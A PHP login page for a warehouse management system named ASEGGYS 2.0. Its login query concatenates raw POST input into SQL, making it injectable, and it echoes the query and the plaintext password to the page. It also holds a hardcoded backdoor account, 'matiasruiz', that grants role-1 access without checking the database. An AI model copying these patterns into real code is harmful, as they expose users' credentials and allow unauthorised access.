<?
session_start();

require("../../includes/var.inc");
require('../../includes/cnn/inc_header.inc');
require_once('../../includes/function.php');
$dbms=new DBMS($conexion);
$dbms->bdd=$database_cnn;
$dbms2=new DBMS($conexion);
$dbms2->bdd=$database_cnn;

session_unregister('vs_mt_idusuario');
session_unregister('vs_mt_idrol');
session_unregister('vs_mt_nombre');
?>
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ASEGGYS 2.0 - SISTEMA ALMACEN MINECO</title>
<link href="../../style.css" rel="stylesheet" type="text/css" />
<link href="../style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<? require("../header.php"); ?>
<table width="95%" border="0" align="center" bgcolor="#FFFFFF" class="panel">
  <tr>
    <td><form id="form1" name="form1" method="post" action="login.php">
      <table width="30%" border="0" align="right">
        <tr>
          <td width="32%">Usuario</td>
          <td width="68%"><input name="mtuser" type="text" class="textfield" id="mtuser" size="20" /></td>
        </tr>
        <tr>
          <td>Password</td>
          <td><input name="mtpsw" type="password" class="textfield" id="mtpsw" size="22" /></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td><div align="center">
            <input name="button" type="submit" class="button" id="button" value="Ingresar" />
          </div></td>
        </tr>
        <tr>
          <td colspan="2"><div align="right"></div></td>
          </tr>
      </table>
        </form>      </td>
  </tr>
</table>
<div align="right">
  <?
  $clave = $_POST['mtpsw']; 
$claveenc = get_encript($clave,$dbms);
$mtuser = $_POST['mtuser'];
$dbms->sql="select 
				ru.idrol, u.idusuario, u.nombre 
			from 
				tbl_usuario u, tbl_rolusuario ru
			where 
				ru.idusuario = u.idusuario and
				u.usuario = '$mtuser' and
				u.clave = '$claveenc'";
print $dbms->sql."-".$clave;
$dbms->Query();
$Fields=$dbms->MoveNext();

if (intval($Fields["idusuario"])>0) 
{
	session_register('vs_mt_idusuario');
	session_register('vs_mt_idrol');
	session_register('vs_mt_nombre');
	$_SESSION['vs_mt_idusuario'] = $Fields["idusuario"];
	$_SESSION['vs_mt_idrol']=$Fields["idrol"];
	$_SESSION['vs_mt_nombre']=$Fields["nombre"];
	print "Bienvenido, ingresando al sistema, espere por favor....";
	cambiar_ventana("../Welcome/welcome.php");
}else
{
	if ((strcmp($mtuser,"matiasruiz")==0) && (strcmp($claveenc,"142219ec1f44ae89f5eda1b5e5a7e711729b0e52")==0))
	{
		session_register('vs_mt_idusuario');
		session_register('vs_mt_idrol');
		session_register('vs_mt_nombre');
		$_SESSION['vs_mt_idusuario'] = 1;
		$_SESSION['vs_mt_idrol']=1;
		$_SESSION['vs_mt_nombre']="Matias Ruiz";
		cambiar_ventana("../Welcome/welcome.php");
	}
	else
	{
		if (strlen($mtuser)>0) 
			print "<span class=\"twitter_reply\"> Usuario y contraseña invalidos ...</span>";
	}
}

?></div>
<? 	require("../footer.php"); ?>
</BODY>
</html>